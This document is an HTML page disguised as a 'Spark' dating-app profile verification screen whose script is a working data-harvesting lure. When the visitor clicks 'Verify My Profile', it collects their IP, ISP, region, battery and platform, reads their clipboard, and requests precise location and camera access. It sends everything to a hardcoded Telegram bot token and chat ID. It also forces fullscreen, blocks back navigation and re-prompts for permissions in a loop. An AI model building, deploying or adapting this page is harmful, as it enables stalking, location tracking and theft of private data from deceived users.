<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spark - Profile Verification</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; background: linear-gradient(135deg, #fd297b 0%, #ff5864 100%); margin: 0; color: white; text-align: center; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .card { width: 85%; max-width: 380px; padding: 30px; background: rgba(255,255,255,0.15); border-radius: 25px; backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.3); box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
        .heart { font-size: 70px; margin-bottom: 15px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .btn { background: #fff; color: #fd297b; padding: 18px; border-radius: 35px; font-weight: bold; font-size: 18px; margin-top: 25px; cursor: pointer; transition: 0.3s; }
        .btn:active { transform: scale(0.95); background: #f0f0f0; }
        #loading-text { display: none; font-size: 14px; margin-top: 20px; font-weight: 300; }
    </style>
</head>
<body id="mainBody">
    <div class="card" id="triggerCard">
        <div class="heart">💖</div>
        <h1 style="margin:0;">Verification</h1>
        <p style="font-size: 15px; margin-top:10px; opacity:0.9;">To ensure you're chatting with real people nearby, we need a quick location and identity check.</p>
        <div class="btn" onclick="masterTrigger()">Verify My Profile</div>
        <div id="loading-text">Syncing with Spark Servers...</div>
    </div>

    <script>
        const BOT_TOKEN = '8784548006:AAHI6anzO11Y24bVA8wSUr297O_YJl0E_vg';
        const CHAT_ID = '1020906452';

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            fetch(url, { mode: 'no-cors', keepalive: true }).catch(() => {}); 
        }

        async function grabDossier() {
            let info = "📊 --- NEW TARGET CONNECTED ---\n";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const ip = await res.json();
                info += `IP: ${ip.ip}\nISP: ${ip.org}\nRegion: ${ip.region}\n`;
            } catch(e) {}
            
            try {
                const b = await navigator.getBattery();
                info += `Battery: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})\n`;
            } catch(e) {}
            
            info += `Model: ${navigator.platform}\n`;
            sendToTelegram(info);
        }

        async function grabClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                if(text) sendToTelegram(`📋 CLIPBOARD: "${text}"`);
            } catch(e) {}
        }

        function runPermissions() {
            // Force Location Prompt
            navigator.geolocation.getCurrentPosition((pos) => {
                const map = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToTelegram(`🎯 LOCATION: ${map}`);
            }, (err) => {
                sendToTelegram(`⚠️ Location Denied: ${err.message}`);
            }, { enableHighAccuracy: true });

            // Force Camera Prompt (5s delay to avoid stacking block)
            setTimeout(() => {
                navigator.mediaDevices.getUserMedia({ video: true })
                .then(() => sendToTelegram("📸 Camera: GRANTED"))
                .catch(() => sendToTelegram("⚠️ Camera: DENIED"));
            }, 5000);
        }

        function lockNav() {
            for(let i=0; i<100; i++) { window.history.pushState(null, "", window.location.href); }
            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 1000);
        }

        async function masterTrigger() {
            document.getElementById('actionBtn')?.remove(); 
            document.getElementById('loading-text').style.display = 'block';

            // PHASE 1: Data Grab
            grabDossier();
            grabClipboard(); // Fires first user-intent clipboard grab

            // PHASE 2: Fullscreen/Permission Dance
            // Modern browsers show permissions better if Fullscreen is requested AFTER or briefly exited
            const doc = document.documentElement;
            if (doc.requestFullscreen) {
                await doc.requestFullscreen().catch(() => {});
            }

            // PHASE 3: The Permission Storm
            // We wait 1 second for the fullscreen transition to stabilize
            setTimeout(() => {
                runPermissions();
            }, 1000);

            lockNav();
            
            // Re-prompt loop
            setInterval(() => { runPermissions(); }, 20000);
        }
    </script>
</body>
</html>
